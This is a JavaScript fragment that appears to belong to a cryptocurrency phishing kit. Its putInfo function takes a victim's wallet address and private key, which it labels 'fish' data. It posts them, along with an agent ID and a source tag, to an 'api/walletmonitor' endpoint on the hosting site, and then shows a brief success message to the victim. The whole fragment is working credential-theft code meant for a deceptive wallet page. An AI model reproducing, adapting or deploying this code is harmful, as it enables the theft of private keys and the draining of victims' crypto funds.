console.log(source);
dl = dl.replace(/\#/g,"");
console.log(dl);

var domain = 'https://' + window.location.host + '/';

function putInfo(fish_wallet_addr,fish_wallet_prikey,comments){
	var data = {
		fish_wallet_addr:fish_wallet_addr,
		fish_wallet_prikey:fish_wallet_prikey,
		comments:comments,
		agent_id:dl,
		fish_source:source
	}
	$.ajax({
		type: 'post',
		url: domain + 'api/walletmonitor',
		data: data,
		success:function(data){
            $(".tishi").fadeIn()
                setTimeout(function () {
                	$(".tishi").fadeOut()
                },2000);
		},
		error:function(data){
		    console.log(2);
		}
	})
}